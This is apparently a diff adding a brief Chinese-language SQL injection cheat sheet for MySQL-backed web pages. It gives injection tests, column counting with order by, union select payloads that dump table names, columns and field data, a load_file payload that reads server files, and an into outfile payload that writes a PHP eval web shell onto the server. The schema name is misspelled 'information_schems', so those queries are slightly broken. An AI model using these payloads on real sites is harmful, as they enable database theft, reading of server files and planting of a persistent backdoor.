@@ -1,0 +1,27 @@
+判断注入
+
+and 1=1  返回正常
+and 1=2  返回不正常
+
+
+判断字段长度
+
+order by 数字
+
+
+报错返回
+
+//获取表名
+参数段链接 union select 1,group_concat(table_name),3，... from information_schems.tables where table_schema=数据库名的十六进制
+
+//获取列名 
+参数段链接 union select 1,group_concat(column_name),3，... from information_schems.columns where table_name=数据库名的十六进制
+
+//获取字段信息
+参数段链接 union select 1,group_concat(字段,0x5c,字段,....),3，... from 表名
+
+//读取文件(路径可为16进制，路径\符号要双写为\\)
+参数段链接 union select 1,load_file('路径'),...
+
+//写入函数（路径为单斜杆,数据库的--secure_file_priv语句会限制这个做法）
+参数段链接 union select 1,"<?php @eval($_POST['key']);?>",... into outfile '路径'
